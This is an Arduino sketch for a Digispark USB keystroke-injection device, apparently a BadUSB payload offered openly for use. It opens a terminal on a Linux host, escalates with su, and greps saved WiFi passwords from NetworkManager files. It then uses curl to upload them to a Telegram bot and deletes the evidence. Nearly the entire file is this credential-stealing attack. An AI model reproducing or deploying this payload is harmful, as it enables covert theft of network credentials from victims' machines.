// Author - DARK_BLACK

#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 
#define KEY_ENTER 0x28 

void setup() {
  pinMode(1, OUTPUT); 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke('t', MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("su");
  DigiKeyboard.delay(120);
  DigiKeyboard.println("123"); // enter your actual root password
  DigiKeyboard.delay(500);
  DigiKeyboard.println("grep psk= /etc/NetworkManager/system-connections/* > ~/wifi_passwords.txt"); 
  DigiKeyboard.delay(500);
  
 
  DigiKeyboard.println("curl -F \"document=@wifi_passwords.txt\" https://api.telegram.org/bot<your-bot-api-key>/sendDocument?chat_id=<chat-id>"); 
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.println("rm -rf wifi_passwords.txt"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit")
  DigiKeyboard.delay(100);
  
 
  digitalWrite(1, HIGH); 
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
